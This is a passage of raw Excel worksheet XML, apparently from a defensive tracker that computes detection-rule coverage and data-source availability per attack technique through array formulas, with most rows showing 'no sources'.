        <f t="array" ref="H536">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I536" s="9" t="str" cm="1">
        <f t="array" ref="I536">IF(SUM(IF($C536=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C536=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J536" s="9" t="str" cm="1">
        <f t="array" ref="J53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36" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M536" s="9" cm="1">
        <f t="array" ref="M536">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N536" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O536" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P536" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S53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36" t="s">
        <v>2513</v>
      </c>
      <c r="U536" t="s">
        <v>2545</v>
      </c>
      <c r="W536" t="b">
        <v>1</v>
      </c>
      <c r="X536" t="s">
        <v>2511</v>
      </c>
    </row>
    <row r="537" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A537" t="s">
        <v>2511</v>
      </c>
      <c r="B537" t="s">
        <v>2546</v>
      </c>
      <c r="C537" t="s">
        <v>2547</v>
      </c>
      <c r="D537" t="s">
        <v>1</v>
      </c>
      <c r="E537" t="s">
        <v>2540</v>
      </c>
      <c r="F537" s="9">
        <f t="shared" si="8"/>
        <v>1</v>
      </c>
      <c r="G537" s="9" cm="1">
        <f t="array" ref="G537">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H537" s="9" t="str" cm="1">
        <f t="array" ref="H537">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I537" s="9" t="str" cm="1">
        <f t="array" ref="I537">IF(SUM(IF($C537=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C537=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J537" s="9" t="str" cm="1">
        <f t="array" ref="J53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37" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M537" s="9" cm="1">
        <f t="array" ref="M537">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N537" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O537" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P537" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S53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37" t="s">
        <v>2513</v>
      </c>
      <c r="U537" t="s">
        <v>2548</v>
      </c>
      <c r="W537" t="b">
        <v>1</v>
      </c>
      <c r="X537" t="s">
        <v>2511</v>
      </c>
    </row>
    <row r="538" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A538" t="s">
        <v>2549</v>
      </c>
      <c r="B538" t="s">
        <v>2549</v>
      </c>
      <c r="C538" t="s">
        <v>51</v>
      </c>
      <c r="D538" t="s">
        <v>1</v>
      </c>
      <c r="E538" t="s">
        <v>2550</v>
      </c>
      <c r="F538" s="9">
        <f t="shared" si="8"/>
        <v>6</v>
      </c>
      <c r="G538" s="9" cm="1">
        <f t="array" ref="G538">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H538" s="9" cm="1">
        <f t="array" ref="H538">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>8</v>
      </c>
      <c r="I538" s="9" t="str" cm="1">
        <f t="array" ref="I538">IF(SUM(IF($C538=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C538=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J538" s="9" cm="1">
        <f t="array" ref="J53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538" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>8</v>
      </c>
      <c r="M538" s="9" cm="1">
        <f t="array" ref="M538">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>8</v>
      </c>
      <c r="N538" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O538" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P538" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S53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38" t="s">
        <v>2513</v>
      </c>
      <c r="U538" t="s">
        <v>2551</v>
      </c>
      <c r="V538" t="s">
        <v>2552</v>
      </c>
      <c r="W538" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="539" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A539" t="s">
        <v>2549</v>
      </c>
      <c r="B539" t="s">
        <v>2553</v>
      </c>
      <c r="C539" t="s">
        <v>261</v>
      </c>
      <c r="D539" t="s">
        <v>1</v>
      </c>
      <c r="E539" t="s">
        <v>2554</v>
      </c>
      <c r="F539" s="9">
        <f t="shared" si="8"/>
        <v>4</v>
      </c>
      <c r="G539" s="9" cm="1">
        <f t="array" ref="G539">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H539" s="9" t="str" cm="1">
        <f t="array" ref="H539">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I539" s="9" t="str" cm="1">
        <f t="array" ref="I539">IF(SUM(IF($C539=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C539=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J539" s="9" t="str" cm="1">
        <f t="array" ref="J53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39" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M539" s="9" cm="1">
        <f t="array" ref="M539">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N539" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O539" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P539" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S53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39" t="s">
        <v>2513</v>
      </c>
      <c r="U539" t="s">
        <v>2555</v>
      </c>
      <c r="V539" t="s">
        <v>2556</v>
      </c>
      <c r="W539" t="b">
        <v>1</v>
      </c>
      <c r="X539" t="s">
        <v>2549</v>
      </c>
    </row>
    <row r="540" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A540" t="s">
        <v>2549</v>
      </c>
      <c r="B540" t="s">
        <v>2557</v>
      </c>
      <c r="C540" t="s">
        <v>2558</v>
      </c>
      <c r="D540" t="s">
        <v>1</v>
      </c>
      <c r="E540" t="s">
        <v>2559</v>
      </c>
      <c r="F540" s="9">
        <f t="shared" si="8"/>
        <v>3</v>
      </c>
      <c r="G540" s="9" cm="1">
        <f t="array" ref="G540">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H540" s="9" t="str" cm="1">
        <f t="array" ref="H540">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I540" s="9" t="str" cm="1">
        <f t="array" ref="I540">IF(SUM(IF($C540=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C540=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J540" s="9" t="str" cm="1">
        <f t="array" ref="J54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40" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M540" s="9" cm="1">
        <f t="array" ref="M540">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N540" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O540" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P540" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S54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40" t="s">
        <v>2513</v>
      </c>
      <c r="U540" t="s">
        <v>2560</v>
      </c>
      <c r="V540" t="s">
        <v>2561</v>
      </c>
      <c r="W540" t="b">
        <v>1</v>
      </c>
      <c r="X540" t="s">
        <v>2549</v>
      </c>
    </row>
    <row r="541" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A541" t="s">
        <v>2549</v>
      </c>
      <c r="B541" t="s">
        <v>2562</v>
      </c>
      <c r="C541" t="s">
        <v>2563</v>
      </c>
      <c r="D541" t="s">
        <v>1</v>
      </c>
      <c r="E541" t="s">
        <v>2527</v>
      </c>
      <c r="F541" s="9">
        <f t="shared" si="8"/>
        <v>2</v>
      </c>
      <c r="G541" s="9" cm="1">
        <f t="array" ref="G541">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H541" s="9" t="str" cm="1">
        <f t="array" ref="H541">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I541" s="9" t="str" cm="1">
        <f t="array" ref="I541">IF(SUM(IF($C541=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C541=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J541" s="9" t="str" cm="1">
        <f t="array" ref="J54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41" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M541" s="9" cm="1">
        <f t="array" ref="M541">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N541" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O541" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P541" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S54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41" t="s">
        <v>2513</v>
      </c>
      <c r="U541" t="s">
        <v>2564</v>
      </c>
      <c r="V541" t="s">
        <v>2565</v>
      </c>
      <c r="W541" t="b">
        <v>1</v>
      </c>
      <c r="X541" t="s">
        <v>2549</v>
      </c>
    </row>
    <row r="542" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A542" t="s">
        <v>2549</v>
      </c>
      <c r="B542" t="s">
        <v>2566</v>
      </c>
      <c r="C542" t="s">
        <v>2567</v>
      </c>
      <c r="D542" t="s">
        <v>1</v>
      </c>
      <c r="E542" t="s">
        <v>2527</v>
      </c>
      <c r="F542" s="9">
        <f t="shared" si="8"/>
        <v>2</v>
      </c>
      <c r="G542" s="9" cm="1">
        <f t="array" ref="G542">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H542" s="9" t="str" cm="1">
        <f t="array" ref="H542">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I542" s="9" t="str" cm="1">
        <f t="array" ref="I542">IF(SUM(IF($C542=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C542=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J542" s="9" t="str" cm="1">
        <f t="array" ref="J54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42" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M542" s="9" cm="1">
        <f t="array" ref="M542">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N542" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O542" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P542" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S54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42" t="s">
        <v>2513</v>
      </c>
      <c r="U542" t="s">
        <v>2568</v>
      </c>
      <c r="V542" t="s">
        <v>2569</v>
      </c>
      <c r="W542" t="b">
        <v>1</v>
      </c>
      <c r="X542" t="s">
        <v>2549</v>
      </c>
    </row>
    <row r="543" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A543" t="s">
        <v>2549</v>
      </c>
      <c r="B543" t="s">
        <v>2570</v>
      </c>
      <c r="C543" t="s">
        <v>312</v>
      </c>
      <c r="D543" t="s">
        <v>1</v>
      </c>
      <c r="F543" s="9">
        <f t="shared" si="8"/>
        <v>1</v>
      </c>
      <c r="G543" s="9" cm="1">
        <f t="array" ref="G543">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H543" s="9" t="str" cm="1">
        <f t="array" ref="H543">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I543" s="9" t="str" cm="1">
        <f t="array" ref="I543">IF(SUM(IF($C543=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C543=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J543" s="9" t="str" cm="1">
        <f t="array" ref="J54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43" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M543" s="9" cm="1">
        <f t="array" ref="M543">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N543" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O543" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P543" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S54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43" t="s">
        <v>2513</v>
      </c>
      <c r="U543" t="s">
        <v>2571</v>
      </c>
      <c r="V543" t="s">
        <v>2537</v>
      </c>
      <c r="W543" t="b">
        <v>1</v>
      </c>
      <c r="X543" t="s">
        <v>2549</v>
      </c>
    </row>
    <row r="544" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A544" t="s">
        <v>2549</v>
      </c>
      <c r="B544" t="s">
        <v>2572</v>
      </c>
      <c r="C544" t="s">
        <v>2573</v>
      </c>
      <c r="D544" t="s">
        <v>1</v>
      </c>
      <c r="E544" t="s">
        <v>2540</v>
      </c>
      <c r="F544" s="9">
        <f t="shared" si="8"/>
        <v>1</v>
      </c>
      <c r="G544" s="9" cm="1">
        <f t="array" ref="G544">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H544" s="9" t="str" cm="1">
        <f t="array" ref="H544">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I544" s="9" t="str" cm="1">
        <f t="array" ref="I544">IF(SUM(IF($C544=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C544=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J544" s="9" t="str" cm="1">
        <f t="array" ref="J54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44" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M544" s="9" cm="1">
        <f t="array" ref="M544">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N544" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O544" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P544" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S54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44" t="s">
        <v>2513</v>
      </c>
      <c r="U544" t="s">
        <v>2574</v>
      </c>
      <c r="V544" t="s">
        <v>2575</v>
      </c>
      <c r="W544" t="b">
        <v>1</v>
      </c>
      <c r="X544" t="s">
        <v>2549</v>
      </c>
    </row>
    <row r="545" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A545" t="s">
        <v>2549</v>
      </c>
      <c r="B545" t="s">
        <v>2576</v>
      </c>
      <c r="C545" t="s">
        <v>2577</v>
      </c>
      <c r="D545" t="s">
        <v>1</v>
      </c>
      <c r="E545" t="s">
        <v>2540</v>
      </c>
      <c r="F545" s="9">
        <f t="shared" si="8"/>
        <v>1</v>
      </c>
      <c r="G545" s="9" cm="1">
        <f t="array" ref="G545">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H545" s="9" t="str" cm="1">
        <f t="array" ref="H545">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I545" s="9" t="str" cm="1">
        <f t="array" ref="I545">IF(SUM(IF($C545=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C545=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J545" s="9" t="str" cm="1">
        <f t="array" ref="J54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45" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M545" s="9" cm="1">
        <f t="array" ref="M545">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N545" s="9">
